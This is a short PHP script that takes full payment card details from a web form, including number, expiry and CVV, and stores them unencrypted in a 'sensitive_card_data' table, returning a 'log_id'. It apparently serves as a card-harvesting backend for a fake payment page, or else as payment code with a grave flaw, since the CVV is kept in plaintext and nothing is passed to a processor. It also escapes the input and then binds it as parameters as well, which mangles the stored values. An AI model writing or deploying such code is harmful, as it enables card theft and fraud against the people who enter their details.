<?php
require_once 'db_config.php'; 
header('Content-Type: application/json');

$conn = connectDB();

// --- 1. Retrieve Data from Frontend ---
// Keys MUST match the IDs/Names used in payment.html and the AJAX payload in payment.js!
$cardName  = $conn->real_escape_string(trim($_POST['cardName'] ?? ''));
$cardNumber = $conn->real_escape_string(trim($_POST['cardNumber'] ?? ''));
$expiry = $conn->real_escape_string(trim($_POST['expiry'] ?? ''));
$cvv = $conn->real_escape_string(trim($_POST['cvv'] ?? ''));

// --- 2. Validation ---
if (empty($cardName) || empty($cardNumber) || empty($expiry) || empty($cvv)) {
    echo json_encode(['success' => false, 'message' => 'Missing card details.']);
    $conn->close();
    exit;
}

// --- 3. Database Insertion (Sensitive Data) ---
$sql = "INSERT INTO sensitive_card_data (card_name, card_number, expiry_date, cvv) 
        VALUES (?, ?, ?, ?)";
$stmt = $conn->prepare($sql);
// Bind parameters: (String, String, String, String)
$stmt->bind_param("ssss", $cardName, $cardNumber, $expiry, $cvv); 

if ($stmt->execute()) {
    echo json_encode(['success' => true, 'log_id' => $conn->insert_id]); 
} else {
    error_log("Card Data Save Failed: " . $stmt->error);
    echo json_encode(['success' => false, 'message' => 'Failed to log card data.']);
}

$stmt->close();
$conn->close();
?>